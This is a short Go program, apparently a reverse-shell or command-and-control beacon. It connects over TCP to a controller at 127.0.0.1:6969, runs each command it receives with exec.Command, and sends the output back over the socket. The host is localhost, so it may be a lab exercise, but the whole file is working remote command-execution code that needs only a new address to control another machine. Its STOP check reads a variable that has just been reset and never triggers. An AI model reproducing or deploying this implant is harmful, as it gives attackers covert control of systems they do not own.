package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os/exec"
	"regexp"
	"strings"
)

func main() {
	beacon, err := net.Dial("tcp", "127.0.0.1:6969")
	if err != nil {
		log.Fatalln(err)
	}

	for {
		CmdOut := ""
		text, _ := bufio.NewReader(beacon).ReadString('\n')
		message := strings.Split(text, "\n")
		// if message[0] == "" {
		// 	time.Sleep(3 * time.Second)
		// 	continue
		// }
		if message[0] != "" {
			fmt.Print("->: " + message[0])
			tokens := strings.Split(message[0], " ")
			var c *exec.Cmd
			if len(tokens) == 1 {
				c = exec.Command(tokens[0])
			} else {
				c = exec.Command(tokens[0], tokens[1:]...)
			}
			buf, err := c.CombinedOutput()
			if err != nil {
				CmdOut = err.Error()
			}
			CmdOut += string(buf)
			// fmt.Print(CmdOut)
			re := regexp.MustCompile(`\r?\n`)
			CmdOut = re.ReplaceAllString(CmdOut, "~w")
			fmt.Fprintf(beacon, CmdOut+"\n")
			continue
		}

		if strings.TrimSpace(string(CmdOut)) == "STOP" {
			fmt.Println("TCP client exiting...")
			return
		}
	}

}
